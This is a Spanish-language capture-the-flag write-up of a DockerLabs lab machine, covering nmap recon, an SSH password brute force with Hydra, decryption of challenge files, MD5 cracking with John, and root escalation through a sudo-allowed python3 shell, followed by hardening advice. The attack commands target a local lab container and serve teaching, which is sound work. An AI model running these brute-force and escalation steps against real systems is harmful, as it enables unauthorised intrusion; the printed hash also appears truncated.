# Instalación de máquina vulnerable: dockerlabs.es

**Abel García Domínguez**

## Reconocimiento

### 1. Preparación de la máquina virtual Kali

- Configuración de Kali Linux en VirtualBox con Adaptador 1 en modo “Adaptador puente” sobre la tarjeta Wi-Fi física.
- Objetivo: Kali se comporta como un equipo más de la red local, recibiendo una IP asignada por el router.

### 2. Comprobación de IPs en host y MV

- En Windows: Ejecutado `ipconfig` para obtener la dirección IPv4.
- En Kali: Usado `ip a` para verificar la IP en el rango 172.26.x.x, confirmando que el modo puente funciona correctamente.

### 3. Puesta en marcha de Docker en Kali

- Actualización de repositorios e instalación de Docker:
sudo apt update
sudo apt install -y docker.io

- Habilitación y arranque del servicio:
sudo systemctl enable docker
sudo systemctl start docker

- Verificación del estado: `sudo systemctl status docker` (Active: active (running)).
- Solución de errores de permisos: Añadido el usuario al grupo `docker` y verificado con `docker ps`.

### 4. Descarga y preparación del laboratorio

- Acceso a DockerLabs y descarga de la máquina vulnerable “pequenas-mentirosas” en formato ZIP.
- Guardado en el escritorio de Kali y descomprimido en `~/Desktop/pequenas-mentirosas`.
- Verificación de la presencia del script `auto_deploy.sh` y el archivo `.tar`.

### 5. Ejecución del auto.deploy

- Permisos de ejecución y lanzamiento del script:
cd ~/Desktop/pequenas-mentirosas
chmod +x auto_deploy.sh
sudo bash auto_deploy.sh pequenas-mentirosas.tar

- Resultado: Máquina vulnerable desplegada en Docker con IP interna 172.17.0.2.

### 6. Reconocimiento inicial de la máquina vulnerable

- Comprobación de conectividad:
ping -c 3 172.17.0.2

- Respuestas recibidas sin pérdida de paquetes, TTL=64 (Linux).
- Escaneo de puertos y servicios:
nmap -sV -p- 172.17.0.2

- Puerto 22/tcp abierto: SSH (OpenSSH 9.2p1 sobre Debian).
- Puerto 80/tcp abierto: Servicio web Apache 2.4.62 (Debian).
- Resto de puertos cerrados o filtrados.
- Uso de `searchsploit` para buscar exploits asociados a las versiones detectadas.

---

## Análisis con Hexstrike

### 1. Servicio Web (Puerto 80/tcp)

- **Servicio:** Apache httpd 2.4.62 (Debian)
- **Posibles vulnerabilidades:**
- Vulnerabilidades específicas del servidor (consultar CVEs).
- Configuración insegura: directorios no protegidos, listado de directorios habilitado, módulos con fallos de seguridad.
- Vulnerabilidades de aplicación: SQLi, XSS, LFI/RFI, deserialización insegura, manejo de sesiones.
- Denegación de servicio (DoS) por fallos en headers o límites de recursos.

### 2. Servicio SSH (Puerto 22/tcp)

- **Servicio:** OpenSSH 9.2p1 sobre Debian
- **Posibles vulnerabilidades:**
- Vulnerabilidades específicas de la versión (revisión de CVEs).
- Ataques de fuerza bruta/diccionario si contraseñas débiles.
- Enumeración de usuarios válidos.
- Cifrados y algoritmos débiles.
- Vulnerabilidades en autenticación por clave (configuración incorrecta en authorized_keys o permisos laxos).

---

## Acceso a la web
- Acceso desde Firefox en Kali: `http://172.17.0.2`
- Pista en texto claro: “Pista: Encuentra la clave para A en los archivos.”

---

## Explotación

### Ataque de fuerza bruta con Hydra
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 15

- Resultado: Contraseña encontrada: `secret`.

### Conexión SSH
ssh a@172.17.0.2

- Exploración de directorios y descubrimiento de recursos en `/srv/ftp`:
  - Archivos encontrados: cifrado_aes.enc, clave_publica.pem, mensaje_hash.txt, pista_fuerza_bruta.txt, clave_aes.txt, hash_a.txt, mensaje_rsa.enc, retos.txt, clave_privada.pem, hash_spencer.txt, original_a.txt, retos_asimetrico.txt.

### Descarga de archivos
scp a@172.17.0.2:/srv/ftp/* ~/Desktop/

- Análisis de `retos.txt`:
  - Cifrado Simétrico: Usar AES para desencriptar el archivo proporcionado.

---

## Análisis con Hexstrike

### Principales vulnerabilidades de seguridad explotadas:
- **Fuga de información (Web):** Revelación de la pista crítica en la página de inicio.
- **Autenticación débil (SSH):** Contraseña débil (`secret`) y falta de bloqueo de ataques de fuerza bruta.
- **Control de acceso inseguro (Sistema de archivos):** Archivos sensibles en `/srv/ftp` sin permisos apropiados, permitiendo su lectura y descarga fácil por el usuario comprometido.

### Apache 2.4.62 (puerto 80)

- Apache es una versión reciente, pero hereda riesgos de la rama 2.4.x y de los módulos cargados (mod_proxy, mod_rewrite, etc.), que pueden permitir ataques como request smuggling, SSRF o redirecciones abiertas si están mal configurados.
- Malas prácticas de configuración comunes:
  - Listado de directorios activo.
  - Exposición de archivos sensibles (.htaccess, copias de config, logs).
  - Fuga de versión en cabeceras HTTP.
  - Verbos HTTP innecesarios habilitados.
  - Vulnerabilidades típicas de la aplicación web (SQLi, XSS, LFI/RFI, deserialización insegura).
- Recomendaciones:
  - Aplicar parches de seguridad.
  - Desactivar `Indexes`.
  - Proteger patrones de archivos sensibles.
  - Ocultar versión con `ServerTokens Prod` y `ServerSignature Off`.
  - Limitar métodos HTTP.
  - Auditar a fondo la aplicación que corre sobre Apache.

### OpenSSH 9.2p1 (puerto 22)

- OpenSSH 9.2p1 es moderno, pero puede verse afectado por vulnerabilidades recientes de la familia (Terrapin / CVE-2023-48795) y por fallos dependientes de configuración.
- Principales riesgos:
  - Autenticación por contraseña: permite ataques de fuerza bruta y enumeración de usuarios, sobre todo si hay contraseñas débiles o sin mecanismos de bloqueo.
  - Permitir login directo de root.
  - Habilitar cifrados o MACs obsoletos.
  - Falta de sistemas de defensa como fail2ban.
- Recomendaciones:
  - Deshabilitar `PasswordAuthentication`.
  - Forzar autenticación por clave pública.
  - Desactivar el login de root.
  - Mantener los algoritmos por defecto seguros.
  - Usar herramientas de bloqueo ante múltiples intentos fallidos.
  - Planificar actualizaciones para mitigar CVEs recientes.

### Idea clave

El riesgo real no está solo en la versión de los servicios, sino en cómo están configurados y en las aplicaciones que se ejecutan sobre ellos. Apache puede ser puerta de entrada a través de mala configuración o vulnerabilidades de la aplicación web, mientras que SSH es especialmente sensible a contraseñas débiles y políticas de autenticación mal definidas.

---

## Explotación adicional y pivote

### 1. Descifrado simétrico (AES)

- Se procedió a desencriptar el archivo `cifrado_aes.enc` usando la clave proporcionada en `clave_aes.txt`:
openssl enc -d -aes-128-cbc -in cifrado_aes.enc -out desencriptado_aes.txt -k thisisaverysecretkey!

- El contenido desencriptado fue:
Texto original: Hola

- El resultado no aportó información relevante para la explotación.

### 2. Descifrado asimétrico (RSA)

- Se leyó el archivo `retos_asimetrico.txt`, que indicaba:
Cifrado Asimétrico: Encuentra la clave privada para desencriptar.

- Se desencriptó el archivo `mensaje_rsa.enc` con la clave privada:
openssl pkeyutl -decrypt -in mensaje_rsa.enc -out desencriptado_rsa.txt -inkey clave_privada.pem

- El contenido desencriptado fue:
Texto original: Hola A!

- Tampoco aportó información útil para el siguiente paso.

### 3. Análisis de hashes

- Se examinó el archivo `mensaje_hash.txt`, que contenía la pista:
Descubre el hash y tendrás la clave...

- Se identificó el archivo `hash_spencer.txt` como probable hash de usuario:
7c6a180b36896a0a8c02787eeaf

- Se utilizó John the Ripper para romper el hash:
sudo john --format=raw-md5 hash_spencer.txt

- Resultado:
password1 (?)

- Se logró obtener la contraseña del usuario `spencer`.

### 4. Conexión SSH como spencer

- Se conectó por SSH usando el usuario y la contraseña encontrada:
ssh spencer@172.17.0.2

- Se confirmó el acceso exitoso al sistema.

---

## Escalada de privilegios

### 1. Enumeración de privilegios sudo

- Se listaron los comandos que el usuario `spencer` puede ejecutar como root:
sudo -l

- Resultado:
User spencer may run the following commands on 1f72134edab5:
(ALL) NOPASSWD: /usr/bin/python3

- El usuario podía ejecutar Python3 como root sin contraseña.

---

### 2. Ejecución de Python3 como root

- Se ejecutó Python3 con privilegios de root:
sudo -u root /usr/bin/python3

- Dentro del REPL de Python, se importó el módulo `os` y se ejecutó una shell como root:
import os
os.system("/bin/bash")

- Se confirmó la escalada de privilegios:
root@1f72134edab5:/home/spencer# whoami
root

- Se obtuvo acceso completo al sistema como usuario root.

---

## Nota final 

La explotación de esta máquina evidencia la importancia de la gestión inadecuada de claves criptográficas y hashes, así como la falta de controles de acceso en privilegios de ejecución. La exposición de información sensible y la ausencia de políticas de seguridad robustas permiten la escalada de privilegios y el acceso total al sistema. Es fundamental aplicar buenas prácticas de seguridad en la gestión de claves, almacenamiento seguro de hashes y configuración de permisos para mitigar estos riesgos.